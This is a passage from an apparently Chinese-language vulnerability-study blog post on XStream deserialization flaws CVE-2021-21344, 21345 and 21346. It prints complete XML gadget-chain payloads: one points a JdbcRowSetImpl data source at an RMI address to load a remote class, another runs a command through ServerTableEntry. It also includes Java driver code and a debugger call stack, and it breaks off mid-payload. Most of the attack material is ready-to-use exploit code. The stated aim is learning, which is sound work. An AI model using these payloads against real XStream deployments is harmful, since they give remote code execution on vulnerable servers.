class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://127.0.0.1:1099/w6zukm<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">jaxbObject</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE_2021_21344</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        xStream.fromXML(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/Users/ocean/Cybersecurity/Java_project/Xstream_stu/src/main/resources/cve_2021_21344_payload.xml&quot;</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会弹出计算器</p><p>这里看一下他的反序列流程，这里可以看到开头用的是PriorityQueue类了解过cc链的都知道它重写了readObject方法所以在反序列化时是会杯调用的我们就将断点下在那</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735394671430-a67b3eb7-5af8-4d5c-8879-964311debe56.png" alt=""></p><p>跟进headpify方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735394688606-f74df932-37bd-4b7b-80ae-325a9e6e159e.png" alt=""></p><p>计入siftDown方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735394722570-b3b76ee9-414a-4d0d-920a-193ec006213b.png" alt=""></p><p>继续进入siftDownUsingComparator方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735394769183-7b001f01-05a1-46fc-9022-aecd52e23ff0.png" alt=""></p><p>这里会调用compare方法，此时这里的comparator属性的值是<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735394872196-b04b902c-9f02-4e52-a45e-23270e13c5af.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735394888615-29560649-b86d-4056-9641-8ac96310fae8.png" alt=""></p><p>跟进看看他的compare方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735394920646-783fb188-f87a-4898-a452-47c8ae0f7ae3.png" alt="">跟进compareIndices方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735394989361-1a2beec3-c51e-4d24-8de4-c579d04d6450.png" alt=""></p><p>跟进get方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735395056918-497f16a1-d220-4ff2-968e-457ccf8608f8.png" alt="">后面就是继续跟，各种复杂的调用反正是，看一下调用栈吧，详细的我也不太了解，反正是最后会走到jdbcRowSetImpl里调用lookup方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">connect:<span class="number">622</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">getDatabaseMetaData:<span class="number">4004</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">get:<span class="number">343</span>, Accessor$GetterSetterReflection (com.sun.xml.internal.bind.v2.runtime.reflect)</span><br><span class="line">serializeURIs:<span class="number">402</span>, ClassBeanInfoImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">childAsXsiType:<span class="number">662</span>, XMLSerializer (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">write:<span class="number">256</span>, MarshallerImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">marshal:<span class="number">89</span>, BridgeImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">marshal:<span class="number">130</span>, Bridge (com.sun.xml.internal.bind.api)</span><br><span class="line">marshal:<span class="number">161</span>, BridgeWrapper (com.sun.xml.internal.ws.db.glassfish)</span><br><span class="line">writeTo:<span class="number">109</span>, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">asInputStream:<span class="number">99</span>, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">getInputStream:<span class="number">125</span>, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">getMessage:<span class="number">366</span>, XMLMessage$XMLMultiPart (com.sun.xml.internal.ws.encoding.xml)</span><br><span class="line">getAttachments:<span class="number">465</span>, XMLMessage$XMLMultiPart (com.sun.xml.internal.ws.encoding.xml)</span><br><span class="line">getAttachments:<span class="number">103</span>, MessageWrapper (com.sun.xml.internal.ws.api.message)</span><br><span class="line">get:<span class="number">111</span>, ResponseContext (com.sun.xml.internal.ws.client)</span><br><span class="line">compareIndices:<span class="number">2492</span>, DataTransferer$IndexedComparator (sun.awt.datatransfer)</span><br><span class="line">compare:<span class="number">2970</span>, DataTransferer$IndexOrderComparator (sun.awt.datatransfer)</span><br><span class="line">siftDownUsingComparator:<span class="number">721</span>, PriorityQueue (java.util)</span><br><span class="line">siftDown:<span class="number">687</span>, PriorityQueue (java.util)</span><br><span class="line">heapify:<span class="number">736</span>, PriorityQueue (java.util)</span><br><span class="line">readObject:<span class="number">795</span>, PriorityQueue (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">callReadObject:<span class="number">113</span>, SerializationMethodInvoker (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">doUnmarshal:<span class="number">412</span>, SerializableConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:<span class="number">230</span>, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:<span class="number">72</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:<span class="number">65</span>, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:<span class="number">66</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:<span class="number">50</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:<span class="number">134</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:<span class="number">32</span>, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:<span class="number">1035</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:<span class="number">1019</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:<span class="number">904</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:<span class="number">12</span>, CVE_2021_21344 (com.ocean)</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21345">CVE-2021-21345</h2><h3 id="测试环境-4">测试环境</h3><p>jdk8u65</p><p>xstream 1.4.15</p><p>直接看payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bi</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">jaxbType</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="tag">&lt;/<span class="name">jaxbType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">uriProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">attributeProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">inheritedAttWildcard</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">getter</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">name</span>&gt;</span>verify<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">getter</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">inheritedAttWildcard</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">bi</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tagName</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">context</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">marshallerPool</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">marshallerPool</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">nameList</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">localNames</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">localNames</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">nameList</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jaxbObject</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.corba.se.impl.activation.ServerTableEntry&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">activationCmd</span>&gt;</span>open -a Calculator<span class="tag">&lt;/<span class="name">activationCmd</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">jaxbObject</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里和21344的差别不是太大，唯一的不同点在于执行代码的位置不再使用JdbcRowSetImpl去远程加载恶意类来到本地执行恶意代码，而是使用<code>com.sun.corba.se.impl.activation.ServerTableEntry</code>类直接在本地执行恶意代码。直接看最关键不同的点是什么原因</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735395542917-0917a60c-aa7b-4cc7-b371-c3e1e8130de0.png" alt=""></p><p>可以看到该类的verify方法中调用了一个执行命令的方法并且这里的属性值我们可控所以可以rce</p><h2 id="CVE-2021-21346">CVE-2021-21346</h2><h3 id="测试环境-5">测试环境</h3><p>jdk8u65</p><p>xstream 1.4.15</p><p>直接看payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE_2021</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;sorted-set&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;type&gt;ysomap&lt;/type&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;value class=&#x27;javax.swing.MultiUIDefaults&#x27; serialization=&#x27;custom&#x27;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;unserializable-parents/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;hashtable&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;loadFactor&gt;0.75&lt;/loadFactor&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;threshold&gt;525&lt;/threshold&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;int&gt;700&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;int&gt;0&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;/hashtable&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;javax.swing.UIDefaults&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;defaultLocale&gt;zh_CN&lt;/defaultLocale&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;resourceCache/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;/javax.swing.UIDefaults&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;javax.swing.MultiUIDefaults&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;tables&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;javax.swing.UIDefaults serialization=&#x27;custom&#x27;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;unserializable-parents/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;hashtable&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;default&gt;\n&quot;</span> +</span><br><span class="line">                <span 